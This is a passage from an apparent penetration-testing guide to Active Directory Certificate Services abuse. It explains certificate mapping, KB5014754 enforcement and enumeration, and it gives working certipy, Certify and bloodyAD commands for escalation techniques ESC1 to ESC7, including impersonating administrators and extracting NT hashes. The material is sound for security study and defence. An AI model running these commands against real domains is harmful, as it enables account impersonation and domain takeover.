| Certificate Request Agent | `1.3.6.1.4.1.311.20.2.1` | Not for authentication, for co-signing others' requests |
| Server Authentication | `1.3.6.1.5.5.7.3.1` | Not sufficient on its own, which is what makes ESC15 interesting |

#### Subject, SAN and identity

The subject distinguished name of a certificate is largely decorative for domain authentication. The field that matters is the **subject alternative name**, specifically the `otherName` of type UPN for user certificates and the `dNSName` for machine certificates. When a domain controller is handed a certificate it needs to decide which security principal it represents, and historically it did that by taking the UPN out of the SAN and looking it up in the directory. That is the entire mechanism of ESC1: the CA lets you write `administrator@$DOMAIN` into a SAN field, and the domain controller believes it.

Since May 2022 there is a third field in play, a Microsoft private extension with OID `1.3.6.1.4.1.311.25.2`, usually called the **SID security extension**, into which the CA writes the `objectSid` of the account that actually made the request. That extension is the subject of the strong mapping section below and it is what makes several of these techniques conditional rather than automatic.

#### From a certificate to a TGT to an NT hash

**PKINIT** is the public key extension to the Kerberos AS exchange, defined in RFC 4556. Instead of proving knowledge of a long-term key derived from a password, the client signs the AS-REQ pre-authentication data with the private key of its certificate and includes the certificate. The KDC validates the chain to a CA present in `NTAuthCertificates`, checks revocation, maps the certificate to an account, and returns a TGT. It also returns a session key established either by Diffie-Hellman or by RSA key transport, which is why the private key must be usable for key exchange and not only for signing.

The step that makes this so valuable is what the KDC puts inside the ticket. Because a smart card user still needs to authenticate to NTLM-only services, the KDC places the account's NTLM credential in a `PAC_CREDENTIAL_INFO` buffer inside the PAC of a PKINIT-issued TGT, encrypted to the AS reply key. Requesting a user-to-user service ticket for yourself lets you decrypt that buffer and read the NT hash out. This is known as **UnPAC the hash**, and it is what `Rubeus.exe asktgt /getcredentials` and `certipy auth` are doing when they print an NT hash. The chain is therefore: influence the identity in a certificate, PKINIT as that identity, unPAC the hash, and you now hold that account's NT hash for use with any tool that takes one.

If the account has no NTLM credential, or the estate has disabled NTLM credential return, you keep the TGT and use Kerberos throughout. If PKINIT is unavailable entirely, the Schannel route described later gives you an authenticated LDAP session instead of a ticket.

### KB5014754 and strong certificate mapping

This is the most important thing to have happened to AD CS abuse and it postdates the 2020-era notes entirely. Read it before ESC9 and ESC10, which are meaningless without it.

Before May 2022 the mapping from certificate to account was **weak**: the domain controller read the UPN out of the SAN, found the matching account, and authenticated it. Nothing in the certificate tied it to the account that requested it, so any technique that let you write a chosen UPN into a certificate was a direct impersonation primitive.

KB5014754 (10 May 2022) changed both ends. On the CA side, issued certificates gain the SID security extension `1.3.6.1.4.1.311.25.2` containing the `objectSid` of the requesting account. On the domain controller side, the KDC gained a `StrongCertificateBindingEnforcement` registry value under `HKLM\SYSTEM\CurrentControlSet\Services\Kdc`, and Schannel gained changes to `CertificateMappingMethods` under `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel`.

| `StrongCertificateBindingEnforcement` | Behaviour |
| --- | --- |
| `0` | Disabled. No strong mapping required, pre-2022 behaviour, and the ESC10 case 1 condition |
| `1` | Compatibility mode. The default after the update. Weak mappings are permitted and logged |
| `2` | Full enforcement. A certificate that cannot be strongly mapped is rejected |

A **strong** mapping is one that ties the certificate to a specific account by something the requester cannot forge: the SID security extension, an `altSecurityIdentities` entry of type `X509IssuerSerialNumber`, `X509SKI` or `X509SHA1PublicKey`, or key trust via `msDS-KeyCredentialLink`. A **weak** mapping is one derived from attacker-influenceable naming: the UPN in the SAN, or `altSecurityIdentities` entries of type `X509IssuerSubject`, `X509SubjectOnly` or `X509RFC822`.

For Schannel, `CertificateMappingMethods` is a bitmask. `0x1` (subject/issuer), `0x2` (issuer) and `0x4` (UPN) are the weak methods, and `0x8` and `0x10` are the S4U2Self-based strong methods that became the default of `0x18` after the update. A domain controller with `0x4` still set will map an LDAPS client certificate by UPN, which is ESC10 case 2.

The enforcement timeline slipped repeatedly: compatibility mode from **10 May 2022**, full enforcement originally slated for 9 May 2023, deferred to 14 November 2023, then to **11 February 2025**, which is the date it actually shipped as the default. The important development for current work is what came next: the **9 September 2025** updates removed support for the `StrongCertificateBindingEnforcement` value altogether. On a domain controller patched past that point you cannot durably set it back to `1` or `0`, so the compatibility-mode window has closed rather than merely become unfashionable.

Two related values are worth knowing while you are in that key. `CertificateBackdatingCompensation` takes a number of seconds and controls how far a certificate may predate its account before the "certificate predates account" rejection fires, which is why some estates set it to a year (`0x1E13380`) or more. `UseSubjectAltName` set to `0` makes the KDC ignore the SID security extension entirely, which is a rarer but equally useful finding.

The practical consequence for the operator is that the taxonomy has split in two. Techniques where the CA legitimately issues to your identity or to a real target identity, so the SID extension agrees with the principal you authenticate as, are unaffected: ESC3, ESC7, ESC8, ESC11, ESC13 and ESC14 with a strong explicit mapping. Techniques where you forge a UPN and the SID extension therefore contradicts you are conditional on the domain controller's enforcement level or on the extension being absent, which is exactly what ESC9 and ESC16 arrange.

Precisely how a compatibility-mode domain controller resolves a certificate whose SID extension names one account and whose UPN names another is the hinge on which several techniques turn, and it is worth testing in the estate rather than assuming. Microsoft's own description of compatibility mode is that the KDC checks for a strong mapping and permits authentication where either the account predates the certificate or a valid SID extension is present, which is deliberately loose and does not resolve the contradiction case explicitly. Empirically, ESC1 continues to succeed very widely against compatibility-mode domain controllers, while ESC6 against a patched CA is generally reported as broken. Do not extrapolate from either result to the other; test the specific technique against the specific domain controller, and read the KDC mapping events described under detection, which will tell you exactly which mapping the domain controller settled on.

The relevant KDC events are described under detection. If you see `KDC_ERR_CLIENT_NAME_MISMATCH` or the equivalent mismatch event on the domain controller, the SID extension is contradicting your requested identity and you need an ESC9, ESC16 or explicit-mapping route instead.

### Discovery

#### Enumerating from Linux with certipy

The source reduces this to one command. It deserves more, because the flags materially change what you see and the wrong combination hides real findings.

```bash
# Full picture: every CA, every template, ACLs, CA configuration
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -stdout

# Machine-readable, and a BloodHound-ingestible archive
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -json
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -bloodhound

# The triage view: only what is enabled and only what certipy judges abusable
certipy find -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -enabled -vulnerable -hide-admins -stdout

# Kerberos instead of a password, and LDAPS where plain LDAP is blocked
export KRB5CCNAME=$PWD/$USER.ccache
certipy find -k -no-pass -target $DC -stdout
certipy find -u $USER@$DOMAIN -hashes :$NTHASH -dc-ip $DC -scheme ldaps -stdout
```

What the filters actually do:

| Flag | Effect | When it hurts you |
| --- | --- | --- |
| `-enabled` | Only templates published by at least one CA, that is, present in some CA's `certificateTemplates` attribute | Never for exploitation, but a disabled template you can write to is still an ESC4 target, and this flag hides it |
| `-vulnerable` | Only templates and CAs where certipy's own logic finds a condition met by a principal you are considered to control | Its judgement is based on the groups of the account you authenticated as. It will not show you a template that becomes exploitable after your next lateral move |
| `-hide-admins` | Drops findings whose only qualifying principals are administrative groups | If you already hold or can reach an account in `Domain Admins`, `Cert Publishers`, `Enterprise Admins` or a delegated PKI group, this flag hides your actual path |
| `-stdout` | Prints instead of writing timestamped output files | Use the files as evidence, use stdout for iteration |

Run the unfiltered form once and keep it. The `-enabled -vulnerable -hide-admins` form is a triage shortcut, not a substitute, and every one of those three filters can suppress a genuine escalation.

**Common mistake.** Treating `-vulnerable` as authoritative. Certipy is evaluating an ACL against the token you gave it. A template with `WriteProperty` granted to a group you can join, or enrolment granted to `Domain Computers` when you can add a machine account, is exploitable and will not necessarily be flagged. Read the full ACL dump.

#### Reading the output

The value of the text output is that it tells you exactly which condition is met, and each condition maps to a different technique and a different exploitation path. The fields to read on each template:

- **Enabled** and **Certificate Authorities**: is it published, and by which CA. If this is empty, nothing will issue it.
- **Client Authentication** and **Extended Key Usage**: can the resulting certificate authenticate. If Any Purpose or the EKU list is empty, note ESC2.
- **Enrollee Supplies Subject**: the ESC1 condition.
- **Requires Manager Approval**: if true, ESC1 becomes a pending request that needs an officer, which is where ESC7 comes in.
- **Authorized Signatures Required** and **Application Policies**: non-zero means you need an enrolment agent certificate, which is the ESC3 second stage.
- **No Security Extension**: the ESC9 condition.
- **Schema Version**: version 1 with enrollee-supplied subject is the ESC15 condition.
- **Certificate Policy** or issuance policy with a group link: ESC13.
- **Permissions / Enrollment Rights**: who can ask.
- **Permissions / Object Control Permissions**: who can rewrite the template, that is ESC4.

And on each CA:

- **Web Enrollment** and its enforcement of HTTPS and channel binding: ESC8.
- **Enforce Encryption for Requests**: if disabled, ESC11.
- **User Specified SAN**: if enabled, `EDITF_ATTRIBUTESUBJECTALTNAME2` is set, which is ESC6.
- **Request Disposition**, **Permissions / Owner**, **Access Rights** including `ManageCA` and `ManageCertificates`: ESC7.
- **Disabled Extensions** listing `1.3.6.1.4.1.311.25.2`: ESC16.

#### Enumerating from Windows

Native tooling first, because it needs nothing dropped to disk and looks like administration.

```cmd
:: Enterprise CAs published in AD
certutil -config - -ping
certutil -dump
:: Templates the current user can see, and the full template definitions
certutil -template
certutil -CATemplates
:: CA configuration, run against the CA
certutil -config "$CAHOST\$CA" -getreg "policy\EditFlags"
certutil -config "$CAHOST\$CA" -getreg "CA\InterfaceFlags"
certutil -config "$CAHOST\$CA" -getreg "policy\DisableExtensionList"
```

```powershell
# Enrollment services and templates straight out of the configuration partition
$conf = (Get-ADRootDSE).configurationNamingContext
Get-ADObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,$conf" -Filter * -Properties dNSHostName,certificateTemplates
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$conf" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,msPKI-RA-Signature,pKIExtendedKeyUsage,msPKI-Template-Schema-Version,nTSecurityDescriptor

# What the PKI client itself thinks you can enrol in
Get-CertificateAutoEnrollmentPolicy -Scope User
```

Certify is the purpose-built enumerator and it evaluates the same conditions certipy does:

```cmd
Certify.exe cas
Certify.exe find
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
Certify.exe find /enrolleeSuppliesSubject
Certify.exe find /clientauth
Certify.exe pkiobjects
```

`Certify.exe pkiobjects` is the ESC5 view: it enumerates ACLs on the PKI objects that are not templates, which is the part almost everyone skips.

#### BloodHound CE

BloodHound CE ingests AD CS natively and models the escalations as edges, which is by far the fastest way to answer "is there a path from what I hold now". The attack edges are named after the techniques and there are exactly ten: `ADCSESC1`, `ADCSESC3`, `ADCSESC4`, `ADCSESC6a` and `ADCSESC6b`, `ADCSESC9a` and `ADCSESC9b`, `ADCSESC10a` and `ADCSESC10b`, and `ADCSESC13`, with the lettered suffixes distinguishing user-principal from machine-principal variants. They are supported by structural edges such as `Enroll`, `AllExtendedRights`, `EnrollOnBehalfOf`, `DelegatedEnrollmentAgent`, `WritePKIEnrollmentFlag`, `WritePKINameFlag`, `ManageCA`, `ManageCertificates`, `HostsCAService`, `PublishedTo`, `EnterpriseCAFor`, `RootCAFor`, `TrustedForNTAuth` and `NTAuthStoreFor`.

Note the gaps, because they are wide: **ESC2, ESC5, ESC7, ESC8, ESC11, ESC12, ESC14, ESC15 and ESC16 have no composite edge**. An empty `ADCSESC*` result is not an all-clear on AD CS. ESC7 is visible as `ManageCA` and `ManageCertificates`, ESC8 as `CoerceAndRelayNTLMToADCS`, and CA key theft as `GoldenCert`; the rest you find from the raw properties.

**Common mistake.** Reaching for `certipy find -bloodhound`. Certipy 4.x had `-bloodhound` and `-old-bloodhound`; **certipy 5.x removed both** and no longer emits BloodHound-format data at all. The relationship inverted: 5.x can *read* a BloodHound database, using `-neo4j-user`, `-neo4j-pass`, `-neo4j-host` and `-neo4j-port` on the `parse` command to resolve SIDs and pull owned principals into its own analysis. If you want ADCS data in the graph, collect it with SharpHound's `CertServices` and `CARegistry` methods, or with RustHound-CE which collects it unconditionally.

Note that BloodHound's ESC edges encode the strong mapping preconditions, so an environment in full enforcement will legitimately show fewer edges than a raw certipy finding count suggests.

#### Is it actually enrollable by you

This is the step that separates a finding from an exploit, and it has three parts.

**Is it published.** The template name must appear in the `certificateTemplates` attribute of a `pKIEnrollmentService` object. If it does not, no CA will issue it and the fastest fix is ESC7 (`certipy ca -enable-template`) if you hold `ManageCA`.

**Do you hold enrolment rights, transitively.** Read the template ACL for `Certificate-Enrollment` and resolve the trustees through nested group membership, including the implicit ones. `Authenticated Users`, `Domain Users`, `Domain Computers` and `Everyone` are the ones worth grepping for. Remember that if you can add a machine account, `Domain Computers` counts.

**Will the CA accept you.** The `pKIEnrollmentService` object has its own ACL with an enrolment right, and the CA can additionally restrict enrolment agents. A template you have rights on, published by a CA that will not let you request, is still not exploitable.

The only definitive test is to request. A denied request costs you one row in the CA database, which you have already accepted by being here, and it answers the question unambiguously.

```bash
# The decisive test. Either you get a pfx, a pending request ID, or a specific denial
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template $TEMPLATE
```

### The escalation taxonomy

The numbering comes from SpecterOps' *Certified Pre-Owned* (ESC1 to ESC8) and has been extended by later research (ESC9 onward). The numbers are a shared vocabulary, not a severity ordering. ESC1, ESC4, ESC7 and ESC8 account for the overwhelming majority of real-world domain compromises via AD CS.

| ID | Misconfiguration | Precondition | Yield | Broadly viable |
| --- | --- | --- | --- | --- |
| ESC1 | Enrollee supplies subject on a client-auth template | Enrolment rights, no manager approval, no RA signature | Certificate as any principal, TGT, NT hash | Yes, still the most common finding, subject to mapping enforcement |
| ESC2 | Any Purpose EKU or no EKU | Enrolment rights | Unconstrained certificate, usable for client auth or as a request agent | Yes |
| ESC3 | Certificate Request Agent template plus an on-behalf-of template | Enrolment rights on both, enrolment agents unrestricted | Certificate as any principal, unaffected by strong mapping | Yes |
| ESC4 | Write access to a template object | `GenericWrite`, `WriteDacl`, `WriteOwner` or `WriteProperty` on the template | Turn any template into ESC1, then ESC1 | Yes, very common via poorly scoped delegation |
| ESC5 | Write access to other PKI objects, or control of the CA host | Control of the CA computer object, the containers, or `NTAuthCertificates` | Full PKI compromise, forgery, arbitrary trust | Yes |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA | Enrolment rights on any client-auth template | Any template becomes ESC1 | Largely broken on patched CAs, see the strong certificate mapping section above |
| ESC7 | `ManageCA` or `ManageCertificates` on the CA | Either right | Approve your own denied request, enable templates, set the ESC6 flag | Yes |
| ESC8 | HTTP web enrolment without channel binding | Coercible authentication plus a relayable target | Certificate as a relayed machine account, typically a DC, then DCSync | Yes where certsrv is HTTP or EPA is off |
| ESC9 | `CT_FLAG_NO_SECURITY_EXTENSION` on a template | Write access to a victim's UPN, DC not in full enforcement | Certificate mapping to a chosen account | Conditional on mapping configuration |
| ESC10 | Weak mapping registry configuration on the DC | `StrongCertificateBindingEnforcement=0`, or Schannel `CertificateMappingMethods` including `0x4` | Same as ESC9 without needing the template flag | Conditional, and case 2 reaches machine accounts |
| ESC11 | `IF_ENFORCEENCRYPTICERTREQUEST` not set on the CA | Coercible authentication, RPC reachable | Relay to MS-ICPR with no HTTP endpoint needed | Yes where the flag is unset |
| ESC12 | CA key on a YubiHSM with the auth key password recoverable | Shell on the CA host | Use a supposedly non-exportable CA key to forge | Niche, only where such an HSM is in use |
| ESC13 | Template with an issuance policy linked to a group | Enrolment rights on that template | Authenticate with the linked group in your PAC | Yes |
| ESC14 | Write access to `altSecurityIdentities` | `GenericWrite` or the specific property write on the victim | Explicit mapping of your certificate to the victim, survives strong mapping if you use a strong type | Yes |
| ESC15 | Version 1 schema template with enrollee-supplied subject, application policies injectable (CVE-2024-49019) | Enrolment rights on such a template | Add Client Authentication or Certificate Request Agent to a server-auth template | Patched November 2024, viable on unpatched CAs |
| ESC16 | SID security extension globally disabled on the CA | Write access to a victim's UPN | ESC9 CA-wide, no template flag required | Conditional on mapping configuration |

#### ESC1: enrollee-supplied subject with client authentication

**What it is.** The template lets you dictate the subject alternative name and the resulting certificate can authenticate. You put someone else's UPN in it.

**Why it works.** With `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set, the CA copies the identity from your CSR into the issued certificate rather than constructing it from your directory object. The domain controller then performs the mapping from that identity to an account. The CA has delegated the naming decision to the requester, and the KDC trusts the CA.

**Preconditions.** All of the following: the template is published by a reachable CA; you hold `Certificate-Enrollment` on it; `msPKI-Certificate-Name-Flag` contains `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`; the EKU set permits client authentication (Client Authentication, PKINIT Client Authentication, Smart Card Logon, Any Purpose, or empty); `msPKI-Enrollment-Flag` does not contain `CT_FLAG_PEND_ALL_REQUESTS`; `msPKI-RA-Signature` is zero or absent. Additionally the domain controller must accept the resulting mapping, see the strong certificate mapping section above.

**Exploitation.**

```bash
# Request a certificate naming the target as its UPN
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template $TEMPLATE -upn administrator@$DOMAIN

# Machine target: use the DNS name instead, and supply the machine SID where the CA permits it
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template $TEMPLATE -dns $DC -sid 'S-1-5-21-...-1000'

# PKINIT with the result, and unPAC the hash
certipy auth -pfx administrator.pfx -dc-ip $DC
```

**Yield.** A TGT and an NT hash for the named principal. Point it at a Domain Admin and you are done; point it at a domain controller's machine account and you have DCSync.

**Common mistake.** The source's Windows example is `Certify.exe request /ca:... /template:... /user:Administrator`. The subject alternative name is supplied with `/altname:`, and `/user:` is not how you name your victim. Requesting without `/altname:` on an ESC1 template gets you a perfectly valid certificate for yourself, which is not an escalation.

#### ESC2: Any Purpose or no EKU

**What it is.** A template whose EKU set is Any Purpose (`2.5.29.37.0`) or empty. Such a certificate is not constrained to a use, so it will satisfy client authentication, and it will also satisfy the Certificate Request Agent requirement.

**Why it works.** EKU is a constraint, and the absence of a constraint is permission. A certificate with no EKU extension is treated as valid for any purpose by CryptoAPI, so a domain controller will accept it for PKINIT and the CA will accept it as an authorised signature on an on-behalf-of request.

**Preconditions.** Enrolment rights on such a template, no manager approval, no RA signature requirement. If the template *also* has enrollee-supplied subject then this is simply ESC1 and you exploit it as ESC1. If it does not, the certificate is issued in your own name and the value is in reusing it as a request agent certificate.

**Exploitation.**

```bash
# Enrol in your own name
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template $TEMPLATE

# Then use it as the signing certificate for an on-behalf-of request (see ESC3)
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template User -on-behalf-of "$NETBIOS\\Administrator" -pfx $USER.pfx
```

**Yield.** Either direct impersonation (if combined with enrollee-supplied subject) or an enrolment agent primitive.

#### ESC3: enrolment agent templates

**What it is.** Two templates chained. The first issues you a certificate carrying the Certificate Request Agent EKU. The second accepts a request co-signed by such a certificate on behalf of an arbitrary principal.

**Why it works.** The enrolment agent design exists so that a smart card operator can enrol certificates for staff who are physically in front of them. The CA validates that the outer signature comes from a certificate with the request agent policy, and then issues to whoever the inner request names. Unless the CA's enrolment agent restrictions bound which agents may act for which principals on which templates, there is no restriction at all: any request agent certificate can enrol for anyone.

This is the technique least affected by KB5014754, because the CA is doing what it was designed to do. It issues the certificate to the on-behalf-of principal as a legitimate holder, so the SID security extension names the target, and strong mapping succeeds.

**Preconditions.** Enrolment rights on a template with the Certificate Request Agent EKU (condition 1) and enrolment rights on a template with a client authentication EKU that requires one authorised signature with the Certificate Request Agent application policy (condition 2). Neither template requires manager approval. The CA does not restrict enrolment agents. A note on condition 2, because the common shorthand is misleading. The default `User` template does not itself require an authorised signature; what makes it usable as the on-behalf-of target is that `msPKI-RA-Signature` is `0` or absent and the CA imposes no enrolment agent restrictions, so the CA will accept a request signed by any valid enrolment agent certificate on behalf of any principal. The template attribute to check for a template that genuinely demands an agent signature is `msPKI-RA-Signature` set to `1` with `msPKI-RA-Application-Policies` naming the Certificate Request Agent OID `1.3.6.1.4.1.311.20.2.1`. Check the CA's `EnrollmentAgentRights` value as well as the template, since that is where the restriction lives when it exists.

**Exploitation.**

```bash
# Stage 1: get the agent certificate
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST -template EnrollmentAgent

# Stage 2: use it to enrol on behalf of the target. Note the NetBIOS\user form
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template User -on-behalf-of "$NETBIOS\\Administrator" -pfx $USER.pfx

certipy auth -pfx administrator.pfx -dc-ip $DC
```

```cmd
Certify.exe request /ca:$CAHOST\$CA /template:EnrollmentAgent
Certify.exe request /ca:$CAHOST\$CA /template:User /onbehalfof:$NETBIOS\Administrator /enrollcert:agent.pfx /enrollcertpw:Password123
```

**Yield.** A certificate legitimately issued to the target principal, then a TGT and an NT hash. The cleanest of the escalations from a mapping perspective and the noisiest from an audit perspective, because the CA database records both the agent and the beneficiary.

#### ESC4: write access to a template object

**What it is.** You cannot request anything useful, but you can rewrite the template so that you can. This is an ACL problem masquerading as a PKI problem, and it is extremely common because certificate templates are frequently delegated to a service desk group or left with over-broad `WriteProperty` from a long-dead automation project.

**Why it works.** The template is just an AD object. `msPKI-Certificate-Name-Flag`, `msPKI-Enrollment-Flag`, `msPKI-RA-Signature`, the EKU attributes and the ACL are all writable attributes. Anyone who can write them can construct an ESC1 template on demand. `WriteOwner` and `WriteDacl` reach the same place in two steps by first granting yourself `GenericAll`.

**Preconditions.** Any of `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteDacl` or `WriteOwner` on a `pKICertificateTemplate` object, and a CA that publishes that template (or `ManageCA` to publish it).

**Exploitation.** The pattern the source gestures at is back up, modify, exploit, restore, and the backup is not optional. A template rewritten to be ESC1 and left that way is a permanent hole with your name on the modification record, and if the template is in production use, changing its name flags and EKUs will break real certificate issuance.

```bash
# 1. Overwrite the template with certipy's built-in ESC1 configuration.
#    A backup JSON is written automatically unless you pass -no-save.
certipy template -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -template $TEMPLATE \
  -write-default-configuration -save-configuration $TEMPLATE.json

# 2. It is now ESC1. Exploit it
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template $TEMPLATE -upn administrator@$DOMAIN

certipy auth -pfx administrator.pfx -dc-ip $DC

# 3. Put it back, immediately, from the saved JSON
certipy template -u $USER@$DOMAIN -p "$PASS" -dc-ip $DC -template $TEMPLATE \
  -write-configuration $TEMPLATE.json
```

Certipy 5.x renamed these flags. Certipy 4.x used `-save-old` to back up and `-configuration <json>` to write; 5.x splits that into `-write-default-configuration` (apply the built-in ESC1 config, optionally taking the SID to grant enrolment to, defaulting to `S-1-5-11` Authenticated Users), `-write-configuration <json>` (apply a config you supply), `-save-configuration <json>` (choose the backup path) and `-no-save` (suppress the automatic backup). `-template` is required and case-sensitive.

**Common mistake.** Assuming no backup exists because you did not ask for one. Certipy 5.x saves the original configuration by default, which is the behaviour you want, but it also means that a `-no-save` in a copied command line silently removes your only restore path. Check that the JSON landed before you modify anything in production use.

Doing it by hand, which is worth knowing because it is more surgical than certipy's blanket overwrite, means setting `msPKI-Certificate-Name-Flag` to include `0x1`, clearing `CT_FLAG_PEND_ALL_REQUESTS` from `msPKI-Enrollment-Flag`, setting `msPKI-RA-Signature` to `0`, ensuring a client authentication OID is in `pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy`, and adding `Certificate-Enrollment` for your principal in `nTSecurityDescriptor`. A minimal change to a single attribute is much easier to revert and much less likely to break issuance than replacing the whole object.

```bash
# Read the current value first. The write below is a replace, not a bitwise OR.
bloodyAD -u $USER -p "$PASS" -d $DOMAIN --host $DC get object \
  'CN=$TEMPLATE,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  --attr msPKI-Certificate-Name-Flag

# Granular alternative: only what you need, using a generic LDAP writer.
# --bak prints the command that restores the original value. Keep that output.
bloodyAD -u $USER -p "$PASS" -d $DOMAIN --host $DC set object \
  'CN=$TEMPLATE,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local' \
  msPKI-Certificate-Name-Flag -v 1 --bak
```

`bloodyAD set object` takes a sAMAccountName, DN or SID as the target, the attribute name, and one or more `-v` values. Omitting `-v` deletes the attribute. `--bak` prints a ready-made restore command, which is the single most useful flag in this workflow.

**Common mistake.** Treating `-v 1` as though it sets a bit. It replaces the whole value. `msPKI-Certificate-Name-Flag` is a bitmask and a production template will already have subject-building flags set, `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` (`0x2000000`) and friends, so writing a bare `1` clears them and can break real issuance while you are still working. Read the current value, OR in `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`), and write the combined result.

**Yield.** ESC1, therefore full impersonation. Note that template changes replicate and are cached by clients, so allow for propagation before the request succeeds, and do not assume an immediate failure means the write did not land.

**Common mistake.** The source labels this section "EC4" and refers to "EC1". They are ESC4 and ESC1. More importantly, the source shows the restore command but not the ordering discipline: get the certificate first, verify it authenticates, and only then restore, because restoring before you have a usable pfx means doing the whole modification again.

#### ESC5: the broader PKI object access control problem

**What it is.** ESC4 generalised to every object whose control affects the PKI. Templates are the obvious ones and everyone checks them. These are the ones nobody checks.

**Why it works.** The trust in an AD PKI is expressed entirely as AD objects and a CA host. Control over any of them subverts the whole system, because there is no out-of-band verification that a certificate the KDC accepts was issued by a CA anybody intended to trust.

**Preconditions.** Any of the following:

- Control of the CA host's computer object (`GenericAll`, `GenericWrite`, `WriteProperty` on `msDS-AllowedToActOnBehalfOfOtherIdentity`, or write on `msDS-KeyCredentialLink`). Resource-based constrained delegation or shadow credentials give you administrative access to the CA host, and administrative access to the CA host gives you the CA private key.
- Local administrator or the ability to run code on the CA host, which is the same conclusion.
- Write access to the `CN=Certificate Templates`, `CN=Enrollment Services`, `CN=Certification Authorities`, `CN=AIA` or `CN=OID` containers, letting you create templates, publish templates, or add trusted CAs.
- Write access to the `CN=NTAuthCertificates` object. This is the crown jewel: add your own CA certificate and every certificate you sign is accepted for domain authentication.
- Control of the `Cert Publishers` group, whose members can publish certificates to the directory.

**Exploitation.** There is no single command, because the primitive is whatever the object gives you. Compromising the CA host leads directly to CA key theft and forgery, which is the DPERSIST1 route in the certificate theft and persistence material later in this section. Writing to `NTAuthCertificates` is a rogue-CA attack: generate your own CA, add its certificate to the store, and forge whatever you like. Publishing a template you created gives you an ESC1 template that never appeared in a security review.

**Yield.** Forest-wide and typically permanent. This is the category to check whenever `certipy find -vulnerable` comes back empty, because certipy's vulnerability logic is template-centric and `Certify.exe pkiobjects` is not.

#### ESC6: the CA-wide user-specified SAN flag

**What it is.** The `EDITF_ATTRIBUTESUBJECTALTNAME2` bit in the CA's policy module `EditFlags`. When set, the CA honours a `SAN:` request attribute on any request, for any template, regardless of whether that template allows enrollee-supplied subjects. Every client-auth template on the CA becomes ESC1.

**Why it works.** The flag exists for legacy interoperability and it moves the naming decision from the template to the requester globally. The template's careful `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` configuration is bypassed because the request attribute is applied after the template's subject construction.

**Preconditions.** The flag set on the CA, plus enrolment rights on any template with a client authentication EKU, for example the default `User` template. Detect it with `certipy find` reporting user-specified SAN as enabled, or:

```cmd
certutil -config "$CAHOST\$CA" -getreg "policy\EditFlags"
```

**Exploitation.** Identical to ESC1 in tooling: request against an ordinary template and supply the UPN. Certipy sets the request attribute for you.

```bash
certipy req -u $USER@$DOMAIN -p "$PASS" -ca $CA -target $CAHOST \
  -template User -upn administrator@$DOMAIN
```

**Yield and viability.** Historically a total compromise from any domain user. On a CA patched with KB5014754 the certificate also carries the SID extension for your own account, which contradicts the UPN you supplied, so a domain controller performing strong mapping refuses it. ESC6 is therefore largely a dead technique against patched CAs. It remains live in three shapes: where the domain controller has `StrongCertificateBindingEnforcement` at `0`, which since the September 2025 updates is no longer a setting you will find on a current build; where the template carries the no-security-extension flag, which is ESC9; or where the CA has the extension globally disabled, which is ESC16. Note that supplying a SID alongside the UPN does not rescue plain ESC6 on a patched CA, because the CA writes the SID extension from the authenticated requester, not from your request. What you need is for the extension to be absent or wrong, which is precisely what ESC9 and ESC16 provide, or a strong explicit mapping, which is ESC14.

**Note.** ESC6 is a prime target of ESC7, because `ManageCA` includes the ability to set this flag remotely.

#### ESC7: CA management rights

**What it is.** Two distinct rights on the CA itself, with different abuse paths.

**ManageCA**, the CA administrator right, lets you change the CA's configuration remotely. That includes setting `EDITF_ATTRIBUTESUBJECTALTNAME2` (giving you ESC6), publishing additional templates on the CA (turning an unpublished vulnerable template into a published one), and adding yourself as a certificate manager, which means `ManageCA` is a superset of `ManageCertificates` in practice.

**ManageCertificates**, the certificate manager or officer right, lets you approve, deny, revoke and retrieve requests. On its own it does not let you request anything you could not already request, but it lets you *issue* a request that the CA denied.

**Why the officer path works.** When a request is refused, or when a template requires manager approval, the request is not discarded. It is stored in the CA database with a request ID and a disposition. A certificate manager can change that disposition to issued, and the CA will then produce the certificate from the stored request, applying the stored request's subject rather than re-evaluating enrolment rights. So you submit a request you are not entitled to, note the request ID, approve it yourself, and retrieve it.

The default `SubCA` template is the ideal vehicle. It has enrollee-supplied subject set and no EKU at all, which makes it a client-auth certificate for anyone you name, and by default only `Domain Admins` and `Enterprise Admins` can enrol in it, which means your request is refused rather than issued and lands in the database ready for approval.

**Preconditions.** `ManageCA` or `ManageCertificates` on the `pKIEnrollmentService` object, or the equivalent on the CA's own security settings.

**Exploitation.**

```bash
# With ManageCA: grant yourself the officer right
certipy ca -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA -add-officer $USER

# Ensure SubCA is published on this CA
certipy ca -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA -enable-template SubCA
certipy ca -u $USER@$DOMAIN -p "$PASS" -target $CAHOST -ca $CA -list-templates

